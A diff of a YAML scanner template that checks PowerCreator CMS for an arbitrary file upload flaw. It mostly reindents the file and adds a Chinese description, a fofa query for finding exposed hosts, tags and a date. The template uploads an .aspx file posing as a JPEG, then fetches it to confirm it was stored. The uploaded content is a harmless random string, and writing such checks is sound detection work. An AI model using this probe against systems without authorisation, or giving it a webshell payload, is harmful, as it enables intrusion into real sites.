@@ -1,42 +1,44 @@
 id: powercreator-arbitrary-file-upload
 
 info:
-    name: Powercreator Arbitrary file upload
-    author: MrP01ntSun(https://github.com/MrPointSun)
-    severity: high
-    verified: true
-    description: |
-        app="PowerCreator-CMS"
+  name: Powercreator Arbitrary file upload
+  author: MrP01ntSun(https://github.com/MrPointSun)
+  severity: high
+  verified: true
+  description: |-
+    PowerCreator CMS 任意文件上传漏洞
+    fofa: app="PowerCreator-CMS"
+  tags: powercreator,upload,asp
+  created: 2023/10/18
 
 set:
-    rand: randomInt(1000, 9999)
-    content: randomLowercase(8)
-    randname: randomLowercase(4)
-    rboundary: randomLowercase(8)
+  rand: randomInt(1000, 9999)
+  content: randomLowercase(8)
+  randname: randomLowercase(4)
+  rboundary: randomLowercase(8)
 rules:
-    r0:
-        request:
-            method: POST
-            path: /upload/UploadResourcePic.ashx?ResourceID={{rand}}
-            headers:
-                Content-Disposition: form-data;name="file1";filename="{{randname}}.aspx";
-                Content-Type: multipart/form-data; boundary=---------------------------WebKitFormBoundary{{rboundary}}
-            body: "\
-                -----------------------------WebKitFormBoundary{{rboundary}}\r\n\
-                Content-Disposition: form-data; name=\"file1\"; filename=\"{{randname}}.aspx\"\r\n\
-                Content-Type: image/jpeg\r\n\
-                \r\n\
-                {{content}}\r\n\
-                -----------------------------WebKitFormBoundary{{rboundary}}--\r\n\
-                "
-        expression: response.status == 200 && response.body.bcontains(b".ASPX")
-        output:
-            search: '"(?P<path>.+?).ASPX".bsubmatch(response.body)'
-            path: search["path"]
-    r1:
-        request:
-            method: GET
-            path: /ResourcePic/{{path}}.ASPX
-        expression: response.status == 200 && response.body.bcontains(bytes(content))
+  r0:
+    request:
+      method: POST
+      path: /upload/UploadResourcePic.ashx?ResourceID={{rand}}
+      headers:
+        Content-Disposition: form-data;name="file1";filename="{{randname}}.aspx";
+        Content-Type: multipart/form-data; boundary=---------------------------WebKitFormBoundary{{rboundary}}
+      body: "\
+        -----------------------------WebKitFormBoundary{{rboundary}}\r\n\
+        Content-Disposition: form-data; name=\"file1\"; filename=\"{{randname}}.aspx\"\r\n\
+        Content-Type: image/jpeg\r\n\
+        \r\n\
+        {{content}}\r\n\
+        -----------------------------WebKitFormBoundary{{rboundary}}--\r\n\
+        "
+    expression: response.status == 200 && response.body.bcontains(b".ASPX")
+    output:
+      search: '"(?P<path>.+?).ASPX".bsubmatch(response.body)'
+      path: search["path"]
+  r1:
+    request:
+      method: GET
+      path: /ResourcePic/{{path}}.ASPX
+    expression: response.status == 200 && response.body.bcontains(bytes(content))
 expression: r0() && r1()
-
